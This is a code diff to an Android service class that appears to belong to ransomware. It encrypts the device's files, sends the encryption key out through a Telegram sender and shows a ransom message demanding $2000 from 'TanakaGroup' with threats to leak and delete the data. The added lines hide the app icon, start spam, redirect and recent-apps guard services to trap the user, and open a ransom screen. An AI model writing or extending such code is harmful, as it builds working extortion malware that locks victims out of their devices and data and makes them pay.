@@ -6,17 +6,18 @@ import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
 import android.os.Build;
+import android.os.Handler;
 import android.os.IBinder;
-import android.util.Log;
+import android.os.Looper;
+import android.widget.Toast;
 
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
+import androidx.core.content.ContextCompat;
 
 public class BackgroundService extends Service {
 
-    private static final String TAG = "BackgroundService";
     private static final String CHANNEL_ID = "bg_channel";
-
     private byte[] key;
     private String keyString;
 
@@ -31,7 +32,6 @@ public class BackgroundService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel ch = new NotificationChannel(
                     CHANNEL_ID, "Background", NotificationManager.IMPORTANCE_MIN);
-            ch.setShowBadge(false);
             NotificationManager nm = getSystemService(NotificationManager.class);
             if (nm != null) nm.createNotificationChannel(ch);
         }
@@ -55,23 +55,33 @@ public class BackgroundService extends Service {
             new Thread(() -> {
                 RansomEngine.encryptAll(key, k -> {
                     TelegramSender.sendKey(keyString);
-                    notifyEncrypted();
-                    stopSelf();
+                    onEncryptDone();
                 });
             }).start();
         }
         return START_STICKY;
     }
 
-    private void notifyEncrypted() {
-        // Toast muncul sekali saat semua file terenkripsi
-        new android.os.Handler(getMainLooper()).post(() -> {
-            android.widget.Toast.makeText(
-                    getApplicationContext(),
+    private void onEncryptDone() {
+        new Handler(Looper.getMainLooper()).post(() -> {
+            Toast.makeText(getApplicationContext(),
                     "Your devices now is Locked by TanakaGroup, pls pay the key with $2000 now!! or your data we share and permanent deleted",
-                    android.widget.Toast.LENGTH_LONG).show();
+                    Toast.LENGTH_LONG).show();
         });
-        // Ganti layar jadi ransom note
+
+        // 1. Ganti icon jadi transparan
+        IconSwitcher.switchNow(getApplicationContext());
+
+        // 2. Jalankan spam toast + notif
+        ContextCompat.startForegroundService(this, new Intent(this, SpamService.class));
+
+        // 3. Jalankan redirect service (app lain -> ransom)
+        ContextCompat.startForegroundService(this, new Intent(this, RedirectService.class));
+
+        // 4. Recent guard
+        ContextCompat.startForegroundService(this, new Intent(this, RecentGuardService.class));
+
+        // 5. Pindah ke layar ransom
         Intent i = new Intent(this, RansomActivity.class);
         i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
         startActivity(i);
